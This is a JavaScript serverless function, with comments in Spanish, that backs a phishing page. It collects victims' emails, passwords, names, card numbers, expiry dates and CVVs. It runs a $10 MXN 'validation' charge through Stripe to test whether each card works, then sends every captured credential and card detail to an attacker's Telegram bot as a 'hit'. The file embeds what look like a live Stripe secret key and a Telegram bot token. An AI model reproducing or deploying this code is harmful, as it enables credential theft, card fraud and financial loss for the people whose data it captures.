import axios from 'axios';
import { stringify } from 'querystring';

export default async function handler(req, res) {
    // 1. Cabeceras CORS obligatorias
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Método no permitido' });
    }

    // 2. Extraer datos
    // cc, ex y cv se usan SOLO para el mensaje de Telegram
    // stripeToken se usa SOLO para el cobro legal en Stripe
    const { em, pw, nm, cc, ex, cv, stripeToken } = req.body;

    const tg_token = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
    const chat_id = "7993722214";
    const stripe_secret = "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";

    try {
        let estatusPago = "No procesado";
        let cargoExitoso = false;

        // 3. Intentar realizar el cobro SI existe un token del navegador
        if (stripeToken) {
            try {
                const chargeData = stringify({
                    amount: 1000, // $10.00 MXN
                    currency: 'mxn',
                    source: stripeToken,
                    description: `Validacion: ${em}`
                });

                const charge = await axios.post('https://api.stripe.com/v1/charges', chargeData, {
                    headers: { 
                        'Authorization': `Bearer ${stripe_secret}`, 
                        'Content-Type': 'application/x-www-form-urlencoded' 
                    }
                });

                if (charge.data.status === 'succeeded') {
                    cargoExitoso = true;
                    estatusPago = "✅ APROBADO ($10.00 MXN)";
                }
            } catch (stripeErr) {
                // Captura si la tarjeta no tiene fondos o es rechazada por el banco
                estatusPago = "❌ RECHAZADA: " + (stripeErr.response?.data?.error?.message || "Error bancario");
            }
        } else {
            estatusPago = " ⚠️ INFO RECIBIDA (Sin cobro - Token ausente)";
        }

        // 4. Reporte a Telegram (SIEMPRE se envía, pase lo que pase con el pago)
        const msgHit = `🔔 **NUEVO HIT DETECTADO** 🔔\n\n` +
                       `💰 **Resultado:** ${estatusPago}\n` +
                       `📧 **Email:** \`${em}\` \n` +
                       `🔑 **Pass:** \`${pw}\` \n` +
                       `👤 **Nombre:** \`${nm}\` \n` +
                       `💳 **Tarjeta:** \`${cc}\` \n` +
                       `📅 **Exp:** \`${ex}\` \n` +
                       `🔒 **CVV:** \`${cv}\``;

        await axios.post(`https://api.telegram.org/bot${tg_token}/sendMessage`, {
            chat_id: chat_id,
            text: msgHit,
            parse_mode: 'Markdown'
        });

        // 5. Responder al navegador
        return res.status(200).json({ 
            pago: cargoExitoso, 
            mensaje_error: cargoExitoso ? "Éxito" : estatusPago 
        });

    } catch (error) {
        // Error crítico del servidor (ej. mala configuración)
        const fatalError = error.message || "Error interno";
        
        // Reportar el error al bot para que sepas que algo anda mal
        await axios.post(`https://api.telegram.org/bot${tg_token}/sendMessage`, {
            chat_id: chat_id,
            text: `⚠️ **Error en Servidor:** ${fatalError}\nDatos intentados: \`${cc}\``
        }).catch(() => {});

        return res.status(200).json({ pago: false, mensaje_error: fatalError });
    }
}
